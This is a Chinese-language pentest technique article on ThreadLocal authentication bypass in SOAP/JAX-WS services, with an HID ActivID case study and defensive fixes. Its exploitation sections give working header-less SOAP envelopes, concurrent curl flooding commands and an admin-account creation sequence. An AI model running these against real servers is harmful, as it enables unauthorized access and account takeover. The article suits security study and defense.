---
attack_surface: [认证/授权绕过, 竞态/时序]
impact: [身份伪造, 权限提升, 完整性破坏, 机密性破坏]
risk_level: 高
prerequisites:
  - SOAP/WSDL 协议基础
  - Java EE 线程池模型理解
  - WAR/EAR 制品逆向基础
related_techniques:
  - race-condition
  - login-bypass
  - dotnet-soap-wsdl-abuse
difficulty: 中级
tools:
  - Burp Suite + Wsdler extension
  - curl / Python SOAP client
  - JDWP / JFR / BTrace
---

# SOAP/JAX-WS ThreadLocal Authentication Bypass — 线程本地存储认证绕过
> 关联文档：[Race Condition](../../Bypasses/Race%20Condition/README.md) · [Login Bypass](../../Bypasses/Login%20Bypass/README.md) · [.NET SOAP/WSDL Client Abuse](https://github.com/carlospolop/hacktricks/tree/master/src/network-services-pentesting/pentesting-web/dotnet-soap-wsdl-client-exploitation.md) · [XXE](../XXE/README.md)

---

# 0x01 原理与根因

## 1.0 TL;DR

部分 Java EE 中间件链（JAX-WS Handler Chain）将已认证用户的 `Subject`/`Principal` 存储在静态 `ThreadLocal` 字段中，且仅在收到特定 SOAP Header 时才更新该值。由于 WebLogic、JBoss、GlassFish 等应用服务器复用工作线程池，攻击者可以：

1. 发送**不带认证 Header** 但结构完整的 SOAP 请求体
2. 当请求被分配到一个之前处理过特权操作的线程时，残留的 `Subject` 被静默复用
3. 以窃取的身份执行受保护操作（创建管理员用户、导入凭据、读取敏感数据）

2025 年 HID ActivID/IASP 漏洞（HID-PSA-2025-002）是这一攻击模式的公开实例。

## 1.1 ThreadLocal 与线程池重用机制

Java EE 应用服务器（WebLogic、JBoss、GlassFish）使用**线程池**处理入站 HTTP 请求。当一个请求完成时，工作线程不会被销毁，而是返回池中等待下一个请求。这意味着：

```
请求 A (admin 认证) → 线程-5 → SubjectHolder.subject = adminSubject → 响应完成 → 线程-5 回池
请求 B (无认证)    → 线程-5 → SubjectHolder.subject 仍是 adminSubject → 以 admin 身份执行
```

`ThreadLocal` 是 Java 提供的线程隔离机制，允许每个线程持有独立变量副本。在 Web 应用中，它常用于存储当前请求的安全上下文。但当 Handler 只在满足条件时才写入、而从不清理时，该机制从"隔离"变成"泄露"。

## 1.2 漏洞根因 — handleMessage 条件更新缺陷

核心问题在于 JAX-WS `SOAPHandler` 的实现模式：

```java
public boolean handleMessage(SOAPMessageContext ctx) {
    if (!outbound) {
        SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
        SOAPHeaderElement e = findHeader(hdr, subjectName);
        if (e != null) {                          // ← 只在 header 存在时才更新
            SubjectHolder.setSubject(unmarshal(e));
        }
        // 缺少 else { SubjectHolder.clear(); }  ← 关键缺失
    }
    return true;
}
```

关键缺陷链：

1. **条件更新而非无条件设置** — `setSubject()` 仅在 `mySubjectHeader` 存在时被调用
2. **从不清理** — 请求处理完成后 `ThreadLocal` 未被 `remove()`
3. **线程池重用** — 应用服务器复用线程，非销毁重建
4. **依赖 `ThreadLocal` 做安全决策** — 后续业务逻辑从 `SubjectHolder.getSubject()` 读取身份

---

# 0x02 枚举与发现

## 2.1 路由与 SOAP 端点发现

SOAP 端点可能不通过 `?wsdl` 暴露元数据。首先枚举反向代理路由规则：

- Nginx: 检查 `/etc/nginx/conf.d/*.conf` 和 include 链，寻找 `proxy_pass` 指向的内部 Java 端口
- Apache: 检查 `mod_proxy` / `mod_jk` 配置中的 `ProxyPass` 指令
- 直接扫描: `nmap -p- -sV` 可能遗漏被防火墙规则屏蔽的内部 Java 端口（如 8443、8445、1005），在取得主机权限后用 `ss -ntalp` 获取完整监听列表

```bash
# 主机枚举 — 发现 nmap 未检测到的内部端口
ss -ntalp | grep java

# 防火墙规则验证
iptables -nvL
```

## 2.2 WAR/EAR 制品逆向

解包应用制品查找 Handler 声明：

```bash
unzip application.ear -d ear_extract/
unzip webapp.war -d war_extract/

# 关键文件搜索
find . -name "application.xml"     # EAR 描述符，列出模块和 EJB
find . -name "web.xml"             # WAR 描述符，Servlet/Filter 映射
find . -name "*HandlerChain.xml"   # JAX-WS Handler 链声明
find . -name "*Handler.java"       # Handler 实现类
find . -name "*-jaxws.xml"         # JAX-WS 端点映射
```

`LoginHandlerChain.xml` 示例：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jws:handler-chains xmlns:jws="http://java.sun.com/xml/ns/javaee">
  <jws:handler-chain>
    <jws:handler>
      <jws:handler-class>com.victim.app.handler.LoginHandler</jws:handler-class>
    </jws:handler>
  </jws:handler-chain>
</jws:handler-chains>
```

## 2.3 WSDL 元数据恢复

当 `?wsdl` 被禁用时：

1. 尝试常见路径爆破：`ServiceName?wsdl`、`ServiceName.wsdl`、`ServiceName?WSDL`
2. 临时放宽实验室代理规则，从内部网络直接请求 WSDL 端点
3. 将恢复的 WSDL 导入 Burp Suite Wsdler 扩展（BApp Store）生成基线 SOAP envelope

## 2.4 Handler 源码审计 — ThreadLocal 持有者识别

使用 `grep` 搜索以下模式识别可疑的 Handler：

```bash
# 搜索 ThreadLocal 声明
grep -rn "ThreadLocal" --include="*.java" .

# 搜索 set + 静态字段组合
grep -rn "static.*Subject\|static.*Principal\|static.*User" --include="*.java" .

# 搜索从不调用 remove() 的 ThreadLocal
grep -rn "\.remove()" --include="*.java" . | wc -l  # 如果数量远小于 ThreadLocal 声明数，红旗
```

注意模式：Handler 的 `handleMessage()` 仅在 `if (header != null)` 分支中写入，且 `finally` 块中无清理逻辑。

---

# 0x03 利用技术

## 3.1 步骤一：带 Header 的正常请求（建立基线）

首先发送携带完整认证 Header 的请求，观察正常响应和错误码：

```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
  <soapenv:Header>
    <tni:mySubjectHeader>
      <name>ftadmin</name>
      <userAlsi><!-- valid ALSI --></userAlsi>
    </tni:mySubjectHeader>
  </soapenv:Header>
  <soapenv:Body>
    <jax:findUserIds>
      <arg0></arg0>
      <arg1>spl*</arg1>
    </jax:findUserIds>
  </soapenv:Body>
</soapenv:Envelope>
```

记录：正常响应码、认证失败时的错误码（如 `AuthorizationException`）、响应时间基线。

## 3.2 步骤二：去 Header 的 SOAP 请求

构建相同的 SOAP Body，但省略认证 Header，Header 元素保留为空：

```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
  <soapenv:Header/>
  <soapenv:Body>
    <jax:findUserIds>
      <arg0></arg0>
      <arg1>spl*</arg1>
    </jax:findUserIds>
  </soapenv:Body>
</soapenv:Envelope>
```

**关键约束**：
- XML 必须 well-formed，命名空间正确
- Header 元素可以空但不能省略（否则可能导致 XML 解析异常，触发 `catch` 分支将 Subject 设为 null）
- Handler 在无异常时**干净退出**，`SubjectHolder` 保持之前的值不变

## 3.3 步骤三：并发洪泛与线程重用概率最大化

线程重用是概率性事件，通过高并发和连接复用来提高命中率：

```bash
# 单次请求基线
curl -ks -H "Content-Type: text/xml;charset=UTF-8" --data @envelope.xml \
  https://target/ac-iasp-backend-jaxws/UserManager

# 高并发洪泛 — 50 并发持续发送
parallel -j50 'curl -ks -H "Content-Type: text/xml;charset=UTF-8" \
  --data @envelope.xml https://target/ac-iasp-backend-jaxws/UserManager \
  -o /dev/null; echo "[i] Request {}"' ::: {1..500}
```

### 3.3.1 关键利用参数

| 参数 | 影响 | 建议值 |
|------|------|--------|
| 并发数 (`-j`) | 同时使用的连接数，越高越可能命中被污染线程 | 线程池大小的 2-3 倍 |
| Keep-Alive | 复用 TCP 连接，避免每次新建连接分配新线程 | 启用（curl 默认） |
| 请求间隔 | 间隔越长，被污染线程越可能被其他请求"洗掉" | 无间隔，持续洪泛 |
| 请求总数 | 统计上足够的尝试次数 | 500-1000+ |

---

# 0x04 HID ActivID/IASP 案例研究 (HID-PSA-2025-002)

## 4.1 受影响产品与版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| ActivID Authentication Appliance (IASP) | 8.7 及之前版本 | FIXS2510005 hotfix |
| 后端 JAX-WS 端点 | `/ac-iasp-backend-jaxws/*` | — |

**发现时间线**：
- 2025.10.10 — Synacktiv 向 HID Global 提交漏洞报告
- 2025.10.17 — HID 确认漏洞
- 2025.10.28 — FIXS2510005 hotfix 发布
- 2025.12.12 — 公告公开

## 4.2 LoginHandler 调用链

完整调用链揭示了认证如何在请求线程间泄露：

```
SOAP Request → LoginHandlerChain.xml → LoginHandler.handleMessage()
  ├── [A.1] readMessage() 解析 SOAP
  ├── [A.2–A.3] 遍历 soapenv:Header，查找 mySubjectHeader
  ├── [A.6–A.7] 解组后调用 LoginHandler.setSubject()
  │     ├── [B.1] 从 MySubject 创建 javax.security.auth.Subject
  │     ├── [B.2] 提取 ALSI（Application-Level Session Identifier）
  │     └── [B.3] SubjectHolder.setSubject() → 存入 static ThreadLocal
  └── 若无异常，Handler 干净返回 → SubjectHolder 保留上次的值

业务逻辑执行:
  ProcessManager.triggerProcess(methodName, args)
    └── [F.1] 从 SubjectHolder.subject 读取 Subject → 做权限决策
```

关键类文件：

```java
// SubjectHolder.java — ThreadLocal 持有者
package com.actividentity.service.iasp.util.security;

public class SubjectHolder {
    private static final ThreadLocal<Subject> subject = new ThreadLocal<>();  // [C.2]

    public static void setSubject(Subject subj) {
        subject.set(subj);  // [C.1] — 设置但不清理
    }

    public static Subject getSubject() {
        return subject.get();
    }
    // 缺少: public static void clear() { subject.remove(); }
}
```

```java
// ProcessManager.java — 读取 ThreadLocal 做权限判断
protected BPVariableMap triggerProcess(String methodName, Map args) {
    BPVariableMap vars = new BPVariableMap();
    vars.put("subject", SubjectHolder.getSubject());  // [F.1] — 使用残留 Subject
    // ... 权限检查、业务逻辑执行
}
```

## 4.3 可靠利用模式

源材料与实际公开利用中观察到了两种不同的攻击路径：

### 场景 A — AT_SYSPKI 身份窃取（无需任何用户认证）

1. 无需任何用户已登录
2. 洪泛 `/ssp` 端点（该端点内部调用链会设置 `SubjectHolder.subject = AT_SYSPKI`）
3. 同时发送 header-less SOAP `getUsers` 请求到 `UserManager` 端点
4. 命中被 `/ssp` 调用污染的线程 → 以 `AT_SYSPKI` 身份返回用户数据

```bash
# 并行：污染线程 + 利用
parallel -j50 'curl -ksL https://target/ssp -o /dev/null; echo "[i] Seed {}"' ::: {1..50}
# 同时持续发送利用请求
while true; do curl -ks -H "Content-Type: text/xml;charset=UTF-8" \
  --data @envelope.xml https://target/ac-iasp-backend-jaxws/UserManager; done
```

### 场景 B — 管理员账户接管（需已有管理员会话）

1. 管理员通过 `/aiconsole` 登录（`SubjectHolder.subject = ftadmin Subject`）
2. 攻击者发送 header-less SOAP `createUser` 请求
3. 当请求命中处理过管理员登录的线程 → 以管理员身份创建 `synacktivadm` 用户
4. 同上发送 `importCredential` 为新建用户设置密码
5. 以 `synacktivadm` 登录管理控制台

```xml
<!-- createUser SOAP envelope -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
  <soapenv:Header/>
  <soapenv:Body>
    <jax:createUser>
      <arg0>synacktivadm</arg0>
      <arg1>Synacktiv</arg1>
      <arg2>Admin</arg2>
      <arg3>synacktivadm@localhost</arg3>
      <arg4>Default</arg4>
    </jax:createUser>
  </soapenv:Body>
</soapenv:Envelope>
```

```bash
# 创建用户 + 导入凭据（可能需要多次重复）
curl -ks -H "Content-Type: text/xml;charset=UTF-8" --data @createUser.xml \
  https://target/ac-iasp-backend-jaxws/UserManager
curl -ks -H "Content-Type: text/xml;charset=UTF-8" --data @importUser.xml \
  https://target/ac-iasp-backend-jaxws/CredentialManager
```

---

# 0x05 漏洞验证

## 5.1 JDWP 远程调试

附加 Java 调试器观察 `ThreadLocal` 在请求前后的值变化：

```bash
# 启动时启用 JDWP（需重启目标 JVM）
java -agentlib:jdwp=transport=dt_socket,server=y,address=5005,suspend=n ...

# 连接调试器，在 SubjectHolder.setSubject() 和 getSubject() 设断点
# 观察: header-less 请求是否继承了之前请求的 Subject
```

验证通过条件：无认证请求的 `SubjectHolder.getSubject()` 返回非 null 值。

## 5.2 JFR/BTrace 生产环境无侵入验证

针对不可重启的生产环境使用 Java Flight Recorder (JFR) 或 BTrace 进行动态插桩：

```java
// BTrace 脚本 — 追踪 SubjectHolder.setSubject 调用
@BTrace
public class SubjectTracer {
    @OnMethod(clazz = "com.actividentity.service.iasp.util.security.SubjectHolder",
              method = "setSubject")
    public static void onSetSubject(Subject s) {
        println("Thread: " + Thread.currentThread().getName() +
                " Subject: " + (s != null ? s.toString() : "null"));
    }

    @OnMethod(clazz = "com.actividentity.service.iasp.util.security.SubjectHolder",
              method = "getSubject")
    public static void onGetSubject(@Return Subject s) {
        if (s != null) {
            println("[!] Thread " + Thread.currentThread().getName() +
                    " inherited non-null Subject: " + s);
        }
    }
}
```

触发条件：任何 `getSubject()` 返回非 null 但对应请求未携带有效认证 Header。

---

# 0x0A 防御与缓解

## A.1 ThreadLocal 生命周期管理

根治方案 — 在每次请求处理完成后显式清理：

```java
public boolean handleMessage(SOAPMessageContext ctx) {
    try {
        if (!outbound) {
            SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
            SOAPHeaderElement e = findHeader(hdr, subjectName);
            if (e != null) {
                SubjectHolder.setSubject(unmarshal(e));
            } else {
                SubjectHolder.clear();  // ← 显式清除
            }
        }
        return true;
    } finally {
        // 更安全的做法：始终在 finally 中清理
        if (outbound) {
            SubjectHolder.clear();
        }
    }
}
```

对于 Servlet Filter 场景，在 `doFilter()` 的 `finally` 块中调用 `ThreadLocal.remove()`。

## A.2 SecurityContext 传播替代方案

使用 Java EE 标准 `SecurityContext` 或在 EJB 层使用 `@RolesAllowed` / `@RunAs` 注解，而非自定义静态 `ThreadLocal`：

```java
// 替代方案：通过 EJBContext 获取调用者身份
@Resource
private SessionContext ctx;

public void businessMethod() {
    Principal caller = ctx.getCallerPrincipal();  // 容器管理，自动传播
    if (!ctx.isCallerInRole("admin")) {
        throw new SecurityException("Access denied");
    }
}
```

## A.3 线程池隔离

- 为不同信任级别的请求路径分配独立线程池，减少跨信任级重用
- Nginx 层面将认证端点 (`/aiconsole`, `/ssp`) 的 upstream 与未认证端点 (`/ac-iasp-backend-jaxws`) 分离到不同端口/线程池

## A.4 检测规则

| 检测层 | 规则 |
|--------|------|
| **静态审计** | 搜索 JAX-WS Handler 中 `ThreadLocal` + `set()` 调用，检查是否有对应的 `remove()` |
| **运行时** | 插桩 `ThreadLocal.get()` 调用，当请求未携带认证 token 但返回非 null Subject 时告警 |
| **流量分析** | 监控 `AuthorizationException` / `ALSIInvalidException` 与成功 SOAP 响应的交错模式 |

---

## 参考资料

- [Synacktiv — ActivID Authentication Bypass (HID-PSA-2025-002)](https://www.synacktiv.com/en/advisories/activid-authentication-bypass.html)
- [Synacktiv — ActivID Administrator Account Takeover: The Story Behind HID-PSA-2025-002](https://www.synacktiv.com/publications/activid-administrator-account-takeover-the-story-behind-hid-psa-2025-002.html)
- [HID Global — Product Security Advisory HID-PSA-2025-002](https://www.hidglobal.com/sites/default/files/documentlibrary/HID-PSA-2025-02%20SOAP_API_a.pdf)
- [PortSwigger — Wsdler (WSDL Parser) Extension](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f)
